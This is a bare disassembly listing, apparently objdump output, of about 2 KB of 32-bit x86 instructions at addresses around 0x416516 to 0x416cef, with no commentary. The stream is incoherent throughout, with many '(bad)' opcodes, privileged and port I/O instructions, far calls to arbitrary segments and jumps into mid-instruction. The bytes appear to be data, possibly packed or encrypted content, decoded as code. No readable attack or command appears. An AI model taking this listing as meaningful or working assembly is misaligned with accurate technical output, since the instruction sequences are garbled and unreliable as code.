  416516:	lods   eax,DWORD PTR ds:[si]
  416518:	icebp  
  416519:	call   0xa71c:0xf68bfbc6
  416520:	push   ecx
  416521:	sub    al,0xd4
  416523:	shl    BYTE PTR [ebp+0x55],1
  416526:	in     al,0x43
  416528:	lahf   
  416529:	mov    ah,BYTE PTR [edi]
  41652b:	dec    edx
  41652c:	push   ss
  41652d:	dec    ebx
  41652e:	out    0x84,eax
  416530:	daa    
  416531:	dec    ebp
  416532:	push   ss
  416533:	cs ret 
  416535:	pop    esp
  416536:	sub    al,0xc0
  416538:	mov    edi,0xffba9ba7
  41653d:	ins    DWORD PTR es:[edi],dx
  41653e:	mov    eax,0x9054068f
  416543:	imul   BYTE PTR [edi]
  416545:	or     eax,0x261c7a5d
  41654a:	and    ah,ah
  41654c:	dec    ebp
  41654d:	hlt    
  41654e:	inc    ecx
  41654f:	les    edi,FWORD PTR [esi+0x6fa27436]
  416555:	ret    
  416556:	call   0x91eff1d8
  41655b:	mov    al,0xc1
  41655d:	test   ecx,ecx
  41655f:	pop    esp
  416560:	les    esi,FWORD PTR [esi+0x51]
  416563:	popa   
  416564:	js     0x416593
  416566:	je     0x4165e2
  416568:	nop
  416569:	leave  
  41656a:	push   ss
  41656b:	mov    BYTE PTR [esi],cl
  41656d:	imul   ecx,DWORD PTR [ecx-0x6e],0xdb316733
  416574:	push   edx
  416575:	iret   
  416576:	mov    edx,0xd7727224
  41657b:	sbb    dl,BYTE PTR [ecx]
  41657d:	mov    ds:0x97cbda3e,eax
  416582:	mov    bh,0xed
  416584:	push   ebx
  416585:	mov    edi,0x54743e30
  41658a:	add    al,0x69
  41658c:	mov    edi,0xd4febbe9
  416591:	inc    esp
  416592:	arpl   WORD PTR [ecx+0x30],ax
  416595:	shl    DWORD PTR [edi-0x462e13e],1
  41659b:	fs neg BYTE PTR cs:[ecx+0x3edba7e9]
  4165a3:	fistp  DWORD PTR [ecx+0x48]
  4165a6:	(bad)  
  4165a7:	in     eax,dx
  4165a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165a9:	(bad)  
  4165aa:	cli    
  4165ab:	ret    
  4165ac:	mov    edi,edi
  4165ae:	rcl    BYTE PTR [edx-0x50],1
  4165b1:	retf   0xd6d5
  4165b4:	jno    0x4165d5
  4165b6:	dec    esi
  4165b7:	pop    ss
  4165b8:	ins    BYTE PTR es:[edi],dx
  4165b9:	xor    ch,BYTE PTR [edx]
  4165bb:	aad    0xb6
  4165bd:	data16 jp 0x416628
  4165c0:	and    eax,0x84ad1331
  4165c5:	or     DWORD PTR [edi+0x5f],0x9dc4bf93
  4165cc:	retf   0x9267
  4165cf:	les    esi,FWORD PTR [ecx+0x57158557]
  4165d5:	fldcw  WORD PTR [eax+0x2e]
  4165d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165d9:	xchg   ecx,eax
  4165da:	call   0x116:0x1aaa8b92
  4165e1:	mov    DWORD PTR [edi-0x53087b17],edi
  4165e7:	adc    ebp,DWORD PTR [ebx-0x454626f6]
  4165ed:	(bad)  
  4165ee:	clc    
  4165ef:	or     al,0x2e
  4165f1:	mov    ch,0xe6
  4165f3:	sbb    al,0x6b
  4165f5:	retf   0x5c60
  4165f8:	and    cl,BYTE PTR [ecx+eax*2-0x64]
  4165fc:	sbb    al,0xb9
  4165fe:	aam    0x31
  416600:	ja     0x4165ce
  416602:	add    dh,BYTE PTR [edi]
  416604:	aad    0x4c
  416606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416607:	popf   
  416608:	fimul  DWORD PTR [edx-0xd]
  41660b:	aam    0x50
  41660d:	rcl    BYTE PTR [esi+0x2bc236ce],cl
  416613:	leave  
  416614:	xchg   ebx,ebx
  416616:	(bad)  
  416617:	cld    
  416618:	int3   
  416619:	test   BYTE PTR [ebx-0x7a],cl
  41661c:	outs   dx,BYTE PTR ds:[esi]
  41661d:	in     al,0x31
  41661f:	dec    DWORD PTR [edi+0x14]
  416622:	cmp    bh,dh
  416624:	mov    edx,0x253d2712
  416629:	hlt    
  41662a:	jb     0x41669f
  41662c:	xchg   edi,eax
  41662d:	out    dx,al
  41662e:	inc    ebp
  41662f:	jge    0x4165fe
  416631:	outs   dx,BYTE PTR ds:[esi]
  416632:	jle    0x416610
  416634:	cmc    
  416635:	stc    
  416636:	adc    ch,bh
  416638:	imul   ebp,DWORD PTR [edx],0x3f
  41663b:	in     al,0x1c
  41663d:	lea    ebp,[eax]
  41663f:	imul   esi,edi,0x994e3db4
  416645:	pop    edi
  416646:	clc    
  416647:	adc    eax,0xda6dbb0f
  41664c:	adc    eax,0x78fdef6d
  416651:	lea    eax,[esi]
  416653:	arpl   WORD PTR [edx],bp
  416655:	cmp    BYTE PTR [ebx+edx*1-0x39462621],ah
  41665c:	push   ecx
  41665d:	bsf    ecx,DWORD PTR [ecx-0x4d]
  416661:	inc    edx
  416662:	out    0x20,eax
  416664:	jg     0x4166d9
  416666:	ret    0xf3db
  416669:	and    ah,0xcc
  41666c:	pop    esp
  41666d:	scas   al,BYTE PTR es:[edi]
  41666e:	cmc    
  41666f:	out    dx,al
  416670:	jp     0x416668
  416672:	jle    0x4166d4
  416674:	pushf  
  416675:	mov    DWORD PTR [edi],edi
  416677:	(bad)  
  416678:	xchg   esp,eax
  416679:	lods   al,BYTE PTR fs:[esi]
  41667b:	mov    esi,0xe7d4cb12
  416680:	fdivr  QWORD PTR ds:0xcdd9a263
  416686:	out    0x54,eax
  416688:	out    dx,al
  416689:	aam    0xdb
  41668b:	fwait
  41668c:	rcr    esp,0x86
  41668f:	push   ds
  416690:	xchg   ecx,eax
  416691:	sub    BYTE PTR [edi],ah
  416693:	iret   
  416694:	loopne 0x4166f9
  416696:	xor    DWORD PTR [ecx+0x16],0x609c19a5
  41669d:	je     0x4166a2
  41669f:	bound  eax,QWORD PTR [edx+0x6d]
  4166a2:	adc    al,0x1
  4166a4:	out    dx,al
  4166a5:	pop    ecx
  4166a6:	adc    ebp,ebp
  4166a8:	jmp    0x1dfe8664
  4166ad:	mov    ch,0xc3
  4166af:	nop
  4166b0:	mov    dh,0x7f
  4166b2:	es mov cx,0xcbb7
  4166b7:	pushf  
  4166b8:	in     eax,0x25
  4166ba:	fdiv   DWORD PTR [ebx-0x19a17e15]
  4166c0:	or     eax,0x1130cebd
  4166c5:	imul   ebx,DWORD PTR [edx+0x51eb752c],0x913df89d
  4166cf:	cmp    bh,BYTE PTR [edx+0x5fbe9027]
  4166d5:	mov    bh,0x7f
  4166d7:	aam    0xe
  4166d9:	mov    db1,ebx
  4166dc:	lods   eax,DWORD PTR ds:[esi]
  4166dd:	mov    ch,0xf7
  4166df:	popa   
  4166e0:	mov    BYTE PTR [ebp-0x5dd51600],bl
  4166e6:	pop    ebp
  4166e7:	ror    BYTE PTR [edi+0x7c],cl
  4166ea:	push   esi
  4166eb:	sub    BYTE PTR [esi-0x55],cl
  4166ee:	or     ah,BYTE PTR ds:[edi+0x62]
  4166f2:	sbb    bl,BYTE PTR [ebp+0x7f]
  4166f5:	dec    DWORD PTR [edx+0x20]
  4166f8:	shl    BYTE PTR [esi+0x23],cl
  4166fb:	push   edi
  4166fc:	add    esp,DWORD PTR [esi+edi*4-0x254aea8]
  416703:	jbe    0x4166ee
  416705:	xor    eax,0xdaa49b7c
  41670a:	inc    esi
  41670b:	dec    BYTE PTR [esi-0x56]
  41670e:	stc    
  41670f:	sahf   
  416710:	loopne 0x4166e8
  416712:	pop    ebx
  416713:	xor    BYTE PTR [ebx-0x78],0x73
  416717:	sub    cl,BYTE PTR [eax+0x7fc7c7d9]
  41671d:	ret    0xf8d2
  416720:	sbb    ebp,ebp
  416722:	jle    0x416742
  416724:	jbe    0x41675b
  416726:	repz sbb ah,BYTE PTR [esi+0x6b0e8e30]
  41672d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41672e:	ins    DWORD PTR es:[edi],dx
  41672f:	rcr    DWORD PTR [ebp-0x43ed13bd],cl
  416735:	aaa    
  416736:	iret   
  416737:	cmp    dl,ah
  416739:	inc    ecx
  41673a:	mov    ch,0x4d
  41673c:	les    eax,FWORD PTR [edi+ecx*1]
  41673f:	or     DWORD PTR [esi],0xde91be91
  416745:	xor    cl,BYTE PTR [ecx-0x6f]
  416748:	inc    eax
  416749:	je     0x4166e1
  41674b:	mov    DWORD PTR [edi],ebp
  41674d:	fcom   DWORD PTR [edx+0x8]
  416750:	pop    ebp
  416751:	loopne 0x416795
  416753:	cmp    ecx,DWORD PTR [edi]
  416755:	xor    ecx,DWORD PTR [esi]
  416757:	dec    dl
  416759:	das    
  41675a:	and    cl,bh
  41675c:	imul   ebx,DWORD PTR [edx+0x5848a3ed],0xffffffce
  416763:	sub    al,0x6f
  416765:	je     0x41675e
  416767:	jmp    0x41674c
  416769:	out    dx,eax
  41676a:	mov    ebp,0x1adcda2a
  41676f:	push   ds
  416770:	cmc    
  416771:	add    dh,BYTE PTR [eax]
  416773:	cld    
  416774:	push   0x74
  416776:	fwait
  416777:	mov    al,ds:0x47654d5c
  41677c:	(bad)  
  41677d:	dec    edi
  41677e:	bound  esp,QWORD PTR [ebx]
  416780:	iret   
  416781:	sbb    bl,BYTE PTR [eax]
  416783:	jae    0x4167f2
  416785:	xor    DWORD PTR [edi+ecx*2-0x1f],ecx
  416789:	js     0x416739
  41678b:	js     0x41675b
  41678d:	mov    edx,0x7611cea6
  416792:	out    0xa3,eax
  416794:	aas    
  416795:	push   ecx
  416796:	xor    ch,al
  416798:	pop    ds
  416799:	mov    bh,0x28
  41679b:	aas    
  41679c:	xchg   ebx,eax
  41679d:	xchg   edx,eax
  41679e:	mov    edi,0x9680183
  4167a3:	fsubr  QWORD PTR [eax+eax*2]
  4167a6:	je     0x41680d
  4167a8:	mov    ecx,DWORD PTR [esi-0x4004dc9a]
  4167ae:	mov    eax,0x28d7929a
  4167b3:	pop    esp
  4167b4:	hlt    
  4167b5:	cs mov edx,0x6c77a444
  4167bb:	ret    
  4167bc:	lods   al,BYTE PTR ds:[esi]
  4167bd:	shl    DWORD PTR [ebp-0x5101a64b],1
  4167c3:	imul   ebp
  4167c5:	sysenter 
  4167c7:	mov    ebp,0xfa04ec77
  4167cc:	sahf   
  4167cd:	and    al,0x6b
  4167cf:	jmp    0x4167ac
  4167d1:	push   esp
  4167d2:	jecxz  0x41683c
  4167d4:	mov    ds:0x14bb1395,al
  4167d9:	idiv   DWORD PTR [edx+esi*4-0x6d4c0a04]
  4167e0:	sti    
  4167e1:	pop    esp
  4167e3:	scas   al,BYTE PTR es:[edi]
  4167e4:	add    ebp,0xc570ac20
  4167ea:	adc    eax,0x4c456fb0
  4167ef:	jmp    0x4167fb
  4167f1:	sbb    eax,0x1770c9da
  4167f6:	gs jp  0x4167e3
  4167f9:	ret    0x5038
  4167fc:	adc    bl,bh
  4167fe:	fwait
  4167ff:	test   eax,0xe0ddc3f1
  416804:	into   
  416805:	cmp    ebp,ebx
  416807:	xor    DWORD PTR [edi-0x35],esi
  41680a:	stos   BYTE PTR es:[edi],al
  41680b:	push   edi
  41680c:	into   
  41680d:	and    DWORD PTR [edi],eax
  41680f:	mov    ebx,0xa6f965e7
  416814:	aam    0xa2
  416816:	ds fs daa 
  416819:	pop    esi
  41681a:	inc    ebx
  41681b:	imul   ebp,DWORD PTR [edx+0xb964d20],0xffffffe4
  416822:	and    eax,0x2c932b88
  416827:	add    al,BYTE PTR [esi-0x4e89354c]
  41682d:	rcl    BYTE PTR [edi+eax*4],cl
  416830:	(bad)  
  416832:	pop    eax
  416833:	aaa    
  416834:	mov    ebx,0x9caa30c6
  416839:	cwde   
  41683a:	fild   QWORD PTR [edx]
  41683c:	int    0x44
  41683e:	and    al,0x28
  416840:	sub    DWORD PTR [ecx-0x35],ecx
  416843:	push   0xffffffad
  416845:	mov    bh,0x8f
  416847:	jle    0x41687e
  416849:	pop    ebp
  41684a:	jmp    eax
  41684c:	cmp    bh,BYTE PTR [ebx]
  41684e:	sub    eax,DWORD PTR cs:[ebp-0x1e5e19ee]
  416855:	fcomp  DWORD PTR [ebp+0x280634de]
  41685b:	sub    dh,BYTE PTR [edi-0x32462936]
  416861:	fistp  DWORD PTR [esi+0x3ed918aa]
  416867:	or     bl,ch
  416869:	(bad)  
  41686b:	mov    ecx,0x7fc83365
  416870:	cmp    DWORD PTR [ebx],esp
  416872:	dec    ecx
  416873:	in     eax,0xdd
  416875:	xor    DWORD PTR [edx-0x37],eax
  416878:	ret    
  416879:	sub    bl,BYTE PTR [ebp-0x20aa627e]
  41687f:	mov    dl,0xd6
  416881:	sub    eax,0x9e939bd2
  416886:	div    DWORD PTR [ebp+0x36b65003]
  41688c:	imul   DWORD PTR [ecx-0x222f72f5]
  416892:	mov    dl,0x3d
  416894:	adc    eax,0xef87db73
  416899:	shl    DWORD PTR [ecx+0x70],1
  41689c:	jnp    0x41684e
  41689e:	outs   dx,BYTE PTR ds:[esi]
  41689f:	pop    esi
  4168a0:	out    0xcc,al
  4168a2:	sub    DWORD PTR [edi],0xa4e69fcf
  4168a8:	leave  
  4168a9:	aam    0xaa
  4168ab:	lods   al,BYTE PTR ds:[esi]
  4168ac:	gs push cs
  4168ae:	mov    cs,WORD PTR [esi]
  4168b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168b1:	push   edx
  4168b2:	mov    ebp,0x11939808
  4168b7:	scas   al,BYTE PTR es:[edi]
  4168b8:	push   eax
  4168b9:	retf   0x11ca
  4168bc:	int3   
  4168bd:	not    BYTE PTR [edi+esi*4+0x70]
  4168c1:	mov    edx,0xa4f66aec
  4168c6:	out    dx,al
  4168c7:	push   es
  4168c8:	cmp    eax,0xdf7fa7ce
  4168cd:	and    ebx,DWORD PTR [edx+0x66]
  4168d0:	sbb    ch,ah
  4168d2:	jb     0x416862
  4168d4:	iret   
  4168d5:	sub    al,BYTE PTR [eax]
  4168d7:	retf   0xfa65
  4168da:	pop    eax
  4168db:	mov    al,ds:0xa3173327
  4168e0:	add    al,0x46
  4168e2:	lods   eax,DWORD PTR ds:[esi]
  4168e3:	fsubr  DWORD PTR [ebp-0x77]
  4168e6:	cmp    dl,0xd0
  4168e9:	adc    edx,DWORD PTR [edx+ebp*1+0x1edbc6ce]
  4168f0:	mov    ecx,0x6bb2ea34
  4168f5:	adc    dl,BYTE PTR [ecx-0x3c2222d7]
  4168fb:	cmp    ah,dh
  4168fd:	inc    esi
  4168fe:	or     dx,cx
  416901:	repnz and al,0x8c
  416904:	rcl    eax,cl
  416906:	xor    bh,bh
  416908:	(bad)  
  416909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41690a:	in     al,0xb2
  41690c:	jmp    0xeaa522d1
  416911:	add    ch,BYTE PTR [eax]
  416913:	cmp    cl,dh
  416915:	repnz and ecx,DWORD PTR [ecx]
  416918:	xchg   ebp,eax
  416919:	xlat   BYTE PTR ds:[ebx]
  41691a:	aas    
  41691b:	fs cwde 
  41691d:	test   BYTE PTR [ebx-0x52],bl
  416920:	fadd   st,st(7)
  416922:	fnstenv [ebp-0x2de1bfcf]
  416928:	push   cs
  416929:	xchg   edi,eax
  41692a:	loopne 0x416939
  41692c:	mov    al,ds:0x59d493e
  416931:	push   ds
  416932:	push   edi
  416933:	ret    
  416934:	ret    
  416935:	popf   
  416936:	xor    BYTE PTR [eax+0x439f4ab2],ch
  41693c:	sub    DWORD PTR [ecx+ebx*2-0x3c1815b0],ebx
  416943:	jb     0x416970
  416945:	(bad)  [ecx-0x44407617]
  41694b:	xchg   esi,eax
  41694c:	xchg   DWORD PTR [edi+0x3ce0f2d5],eax
  416952:	cli    
  416953:	and    al,0xe9
  416955:	mov    WORD PTR ds:0x8bf18c53,gs
  41695b:	es dec eax
  41695d:	mov    ss,edx
  41695f:	mov    esi,0x619d4275
  416965:	retf   0xb265
  416968:	push   esp
  416969:	adc    edi,ebx
  41696b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41696c:	fst    DWORD PTR [esi]
  41696e:	sub    bh,BYTE PTR [esi]
  416970:	hlt    
  416971:	repz sub DWORD PTR ds:0x1fd3635e,esp
  416978:	push   edi
  416979:	pop    ss
  41697a:	sub    al,0xb6
  41697c:	js     0x416977
  41697e:	push   ecx
  41697f:	sti    
  416980:	sbb    DWORD PTR [ecx],eax
  416982:	imul   edx,DWORD PTR [esi-0x180aeb28],0x33
  416989:	js     0x4169b4
  41698b:	addr16 test eax,0x5974cbac
  416991:	mul    DWORD PTR [edi-0x19e19650]
  416997:	adc    ah,BYTE PTR [eax]
  416999:	push   0x301eab3
  41699e:	adc    edi,ebp
  4169a0:	test   ch,cl
  4169a2:	adc    al,0xb7
  4169a4:	cdq    
  4169a5:	(bad)  
  4169a6:	mov    edx,0xbdfd7728
  4169ab:	pop    edx
  4169ac:	dec    ebx
  4169ad:	jp     0x4169ce
  4169af:	pop    esp
  4169b0:	mul    BYTE PTR [ecx+eax*2-0x1d6bc0b6]
  4169b7:	aam    0xe1
  4169b9:	fsubp  st(7),st
  4169bb:	sahf   
  4169bc:	retf   
  4169bd:	add    bh,BYTE PTR [esi+0x79]
  4169c0:	outs   dx,DWORD PTR ds:[esi]
  4169c1:	jne    0x416958
  4169c3:	xor    DWORD PTR [ebx-0x5aa2c378],edx
  4169c9:	push   edi
  4169ca:	repnz data16 and BYTE PTR [eax+0x77],ah
  4169cf:	xchg   DWORD PTR [esp+ecx*2],edx
  4169d2:	mov    esp,0xf58bf431
  4169d7:	and    al,0xd8
  4169d9:	fbld   TBYTE PTR [ebx+0x53f1d79e]
  4169df:	bnd jns 0x4169e4
  4169e2:	xchg   ecx,eax
  4169e3:	clc    
  4169e4:	cmp    esi,edx
  4169e6:	sar    BYTE PTR [ebx],0x44
  4169e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169ea:	dec    edx
  4169eb:	or     DWORD PTR [edi+0x10],esp
  4169ee:	fsubp  st(6),st
  4169f0:	ret    
  4169f1:	stos   BYTE PTR es:[edi],al
  4169f2:	push   esp
  4169f3:	add    DWORD PTR [ebp+0x25923053],eax
  4169f9:	mov    esi,0x584b5bd9
  4169fe:	jno    0x416a67
  416a00:	std    
  416a01:	(bad)  
  416a02:	pop    esi
  416a03:	pop    ebp
  416a04:	sub    ecx,DWORD PTR [ecx-0x4d]
  416a07:	pop    ebx
  416a08:	idiv   DWORD PTR [ebx-0x6d]
  416a0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a0c:	lock mov al,ds:0x8ff4a232
  416a12:	es int3 
  416a14:	cmp    eax,0x5d93c126
  416a19:	push   ss
  416a1a:	sub    al,0xfa
  416a1c:	out    0xa,eax
  416a1e:	aad    0x5
  416a20:	add    ebx,DWORD PTR [ebp+0x20]
  416a23:	jno    0x416a98
  416a25:	cmp    eax,0xd574ae5e
  416a2a:	mov    cs,ebx
  416a2c:	mov    esi,0x5fa1475a
  416a31:	adc    eax,0x9f618d25
  416a36:	jmp    0x455013b5
  416a3b:	and    al,0x44
  416a3d:	dec    edi
  416a3e:	cmp    BYTE PTR [eax-0x10],bh
  416a41:	inc    esi
  416a42:	(bad)  
  416a44:	js     0x416a30
  416a46:	test   eax,0x2a71e1ba
  416a4b:	add    bh,BYTE PTR [ecx]
  416a4d:	scas   al,BYTE PTR es:[edi]
  416a4e:	(bad)  
  416a4f:	mov    al,0x6c
  416a51:	mov    DWORD PTR [eax],edx
  416a53:	inc    eax
  416a54:	cmc    
  416a55:	in     al,dx
  416a56:	inc    ebx
  416a57:	(bad)  
  416a58:	aad    0x80
  416a5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a5b:	jle    0x4169f6
  416a5d:	cli    
  416a5e:	mov    ebp,0xb47bed27
  416a63:	int3   
  416a64:	lahf   
  416a65:	fsub   DWORD PTR [ebx]
  416a67:	pushf  
  416a68:	nop
  416a69:	adc    ecx,DWORD PTR [ebp-0x2dcf9977]
  416a6f:	jmp    0x46da:0x98d11c17
  416a76:	sbb    BYTE PTR [ebp-0x66],cl
  416a79:	lds    edx,FWORD PTR [edi-0x30]
  416a7c:	cmp    DWORD PTR [ebx-0x50c00f06],0xffffffff
  416a83:	call   0x9613:0x1980c62
  416a8a:	jge    0x416a2e
  416a8c:	jmp    0x416a56
  416a8e:	mov    al,ds:0xb6350bd0
  416a93:	mov    cs,WORD PTR [ebx-0x20]
  416a96:	test   BYTE PTR [ebp-0x8e3a6fc],0xd4
  416a9d:	jle    0x416ae2
  416a9f:	aaa    
  416aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aa1:	dec    ebx
  416aa2:	ins    DWORD PTR es:[edi],dx
  416aa3:	repnz dec esp
  416aa6:	pusha  
  416aa7:	pusha  
  416aa8:	leave  
  416aa9:	pop    ebx
  416aaa:	(bad)  
  416aab:	es dec eax
  416aad:	and    DWORD PTR [ebp-0x4ec58786],ebx
  416ab3:	fwait
  416ab4:	pusha  
  416ab5:	fwait
  416ab6:	out    0x99,al
  416ab8:	cdq    
  416ab9:	test   BYTE PTR [ebx],al
  416abb:	rcr    BYTE PTR [ecx+0x567cacc9],1
  416ac1:	push   esi
  416ac2:	cdq    
  416ac3:	inc    ebp
  416ac4:	outs   dx,BYTE PTR ds:[esi]
  416ac5:	add    DWORD PTR [ebp+0x5958820f],ecx
  416acb:	stc    
  416acc:	push   eax
  416acd:	mov    ss,WORD PTR [eax-0x3c]
  416ad0:	scas   eax,DWORD PTR es:[edi]
  416ad1:	mov    bl,0x54
  416ad3:	mov    eax,ebx
  416ad5:	(bad)  
  416ad7:	mov    dh,BYTE PTR ds:0x72cae12b
  416add:	test   eax,0x916b7653
  416ae2:	(bad)  
  416ae3:	stc    
  416ae4:	jae    0x416b3a
  416ae6:	inc    esi
  416ae7:	pop    edi
  416ae8:	xlat   BYTE PTR ds:[ebx]
  416ae9:	pop    ebx
  416aea:	lods   eax,DWORD PTR ds:[esi]
  416aeb:	das    
  416aec:	jae    0x416aa1
  416aee:	lock pop ebx
  416af0:	(bad)  
  416af1:	std    
  416af2:	xchg   esi,eax
  416af3:	rcr    ecx,cl
  416af5:	(bad)  
  416af6:	jmp    0xf5cab7bb
  416afb:	jl     0x416b4a
  416afd:	lds    edx,FWORD PTR [ebp+0x47]
  416b00:	scas   eax,DWORD PTR es:[edi]
  416b01:	add    eax,0x289cdad9
  416b06:	or     eax,0x3b633845
  416b0b:	add    cl,al
  416b0d:	js     0x416a96
  416b0f:	int    0x62
  416b11:	xor    eax,0x5d3b5ac7
  416b16:	stos   DWORD PTR es:[edi],eax
  416b17:	xor    dh,BYTE PTR [eax-0x14]
  416b1a:	popf   
  416b1b:	fidivr WORD PTR ds:0xbb460ca4
  416b21:	mov    edi,0xb70ef01b
  416b26:	push   es
  416b27:	cli    
  416b28:	add    al,BYTE PTR [edx-0x19a9841]
  416b2e:	mov    WORD PTR [edx],?
  416b30:	retf   
  416b31:	mov    bh,0xb3
  416b33:	leave  
  416b34:	call   FWORD PTR [ecx+edx*8+0x4b]
  416b38:	inc    ecx
  416b39:	and    DWORD PTR [esi],ebp
  416b3b:	call   0x86b2:0xc6776746
  416b42:	or     BYTE PTR [ebx*1+0x4f11b5e],al
  416b49:	ficomp DWORD PTR [ebp+0x7e]
  416b4c:	and    dh,dh
  416b4e:	mov    ds:0xd3754b6c,al
  416b53:	in     eax,dx
  416b54:	pop    ecx
  416b55:	mov    eax,ds:0x3c705f63
  416b5a:	shr    dl,cl
  416b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b5d:	(bad)  
  416b5e:	rcr    DWORD PTR [eax+0x4558285e],cl
  416b64:	bound  edi,QWORD PTR [eax]
  416b66:	and    al,0x78
  416b68:	push   0x9a927ce
  416b6d:	inc    esi
  416b6e:	ins    BYTE PTR es:[edi],dx
  416b6f:	lods   eax,DWORD PTR ds:[esi]
  416b70:	shl    ebx,1
  416b72:	add    esi,esi
  416b74:	(bad)  
  416b75:	in     al,0x34
  416b77:	jge    0x416b33
  416b79:	adc    DWORD PTR [edi-0x3e12b5b5],0x39
  416b80:	xchg   ecx,eax
  416b81:	loopne 0x416b2b
  416b83:	sub    dl,BYTE PTR [esp+edx*8-0x58]
  416b87:	xor    al,0x73
  416b89:	sbb    DWORD PTR [esi-0x4e],ecx
  416b8c:	inc    edi
  416b8d:	dec    ecx
  416b8e:	bnd je 0x416c03
  416b91:	shr    DWORD PTR [eax],1
  416b93:	jle    0x416bb0
  416b95:	mov    WORD PTR [edi+0x63],fs
  416b98:	clc    
  416b99:	rol    DWORD PTR [ecx],1
  416b9b:	(bad)
  416ba0:	shr    BYTE PTR ds:0x7a840943,0xae
  416ba7:	xor    ebx,esi
  416ba9:	out    0x3d,eax
  416bab:	scas   eax,DWORD PTR es:[edi]
  416bac:	push   ds
  416bad:	scas   al,BYTE PTR es:[edi]
  416bae:	nop
  416baf:	push   ds
  416bb0:	inc    esp
  416bb1:	out    dx,al
  416bb2:	add    BYTE PTR [edi+eiz*4-0x6b968d5e],ah
  416bb9:	and    DWORD PTR [edi+0x55fca868],0xffffffb2
  416bc0:	loop   0x416bf4
  416bc2:	inc    edi
  416bc3:	pop    ds
  416bc4:	clc    
  416bc5:	push   cs
  416bc6:	sbb    eax,0xd90b74f2
  416bcb:	bound  ebp,QWORD PTR [edi+eax*8-0x3a94ac94]
  416bd2:	cmp    eax,0x5a5a9fdc
  416bd7:	outs   dx,DWORD PTR ds:[esi]
  416bd8:	test   al,0x26
  416bda:	cmp    ch,BYTE PTR [eax+0x4b563c88]
  416be0:	add    ah,BYTE PTR [ecx-0x7d5666a5]
  416be6:	xor    DWORD PTR [eax-0x3a],esp
  416be9:	push   es
  416bea:	mov    al,0x9d
  416bec:	imul   eax,DWORD PTR [ebp-0x66],0xffffffa1
  416bf0:	out    dx,al
  416bf1:	aas    
  416bf2:	push   ds
  416bf3:	bound  ecx,QWORD PTR [edx]
  416bf5:	daa    
  416bf6:	je     0x416c3a
  416bf8:	pop    edx
  416bf9:	mov    edi,0x28d67deb
  416bfe:	sbb    eax,0xb525fe4
  416c03:	hlt    
  416c04:	(bad)  
  416c05:	in     eax,0x55
  416c07:	jno    0x416bac
  416c09:	ins    BYTE PTR es:[edi],dx
  416c0a:	adc    al,0x5e
  416c0c:	ja     0x416c18
  416c0e:	adc    ah,dh
  416c10:	test   ebx,0x97f3cd3a
  416c16:	or     ah,dh
  416c18:	inc    edi
  416c19:	(bad)  
  416c1b:	dec    ebp
  416c1c:	mov    ch,0xf
  416c1e:	adc    al,0x35
  416c20:	dec    esp
  416c21:	cdq    
  416c22:	int3   
  416c23:	add    eax,0xaeb15eca
  416c28:	scas   eax,DWORD PTR es:[edi]
  416c29:	xor    eax,0x3ee2b2ac
  416c2e:	(bad)  ds:0x24679490
  416c34:	pop    esi
  416c35:	ficom  WORD PTR [eax+0x23]
  416c38:	mov    cl,0x86
  416c3a:	push   ds
  416c3b:	sbb    bl,BYTE PTR [edi+0x128ba4ac]
  416c41:	mov    WORD PTR [edx-0x77],?
  416c44:	cmp    eax,0x10f3dc20
  416c49:	aad    0xa
  416c4b:	xor    al,0x66
  416c4d:	mov    esp,0x5d38fe85
  416c52:	cmp    al,0x30
  416c54:	jbe    0x416bd6
  416c56:	ins    DWORD PTR es:[edi],dx
  416c57:	dec    edi
  416c58:	inc    ebp
  416c59:	in     eax,0x4
  416c5b:	icebp  
  416c5c:	(bad)  
  416c5d:	fistp  DWORD PTR [ecx-0x5d83b5e6]
  416c63:	(bad)  
  416c64:	loope  0x416c6f
  416c66:	or     DWORD PTR [ebx+esi*4],esp
  416c69:	data16 (bad) 
  416c6b:	xor    eax,0x2dbdfbd1
  416c70:	sbb    edi,ebp
  416c72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c73:	vshufps xmm7,xmm5,XMMWORD PTR [edi],0xdb
  416c78:	jae    0x416cbe
  416c7a:	or     esi,DWORD PTR [ebp-0x3d]
  416c7d:	sar    BYTE PTR [edx],1
  416c7f:	fst    st(4)
  416c81:	jge    0x416c98
  416c83:	dec    edi
  416c84:	xchg   BYTE PTR [ecx-0x6ffe647b],cl
  416c8a:	inc    esp
  416c8b:	and    bh,BYTE PTR [edi]
  416c8d:	mov    edi,0x5738f385
  416c92:	stos   BYTE PTR es:[di],al
  416c94:	dec    edi
  416c95:	jmp    0x1f07:0x2ee30fb0
  416c9c:	jns    0x416c38
  416c9e:	scas   al,BYTE PTR es:[edi]
  416c9f:	scas   eax,DWORD PTR es:[edi]
  416ca0:	lock cwde 
  416ca2:	cmc    
  416ca3:	cmp    eax,0xdf87cbeb
  416ca8:	mov    dl,ch
  416caa:	push   eax
  416cab:	mov    dl,0x1e
  416cad:	xor    edi,DWORD PTR [ecx+0x15363fd]
  416cb3:	and    ebp,DWORD PTR [esi]
  416cb5:	sar    DWORD PTR [ecx+0x6b],cl
  416cb8:	add    al,0xc3
  416cba:	pop    ebp
  416cbb:	mov    ah,0x87
  416cbd:	cdq    
  416cbe:	out    0xf,al
  416cc0:	adc    ebx,esp
  416cc2:	rcl    eax,0x64
  416cc5:	xor    dh,ch
  416cc7:	adc    eax,0x76a555be
  416ccc:	push   ss
  416ccd:	and    al,0xd7
  416ccf:	gs or  eax,0x544e44ad
  416cd5:	cmp    al,BYTE PTR [edx+ebp*8]
  416cd8:	add    al,0xa0
  416cda:	(bad)  
  416cdb:	fistp  DWORD PTR [edi+0x291a1f72]
  416ce1:	mov    ebx,0xbf45561b
  416ce6:	inc    edx
  416ce7:	call   0xc356:0x1c4244a1
  416cee:	xchg   ebx,eax
  416cef:	adc    ebx,DWORD PTR [edi+ebx*1-0x5bdd4c40]
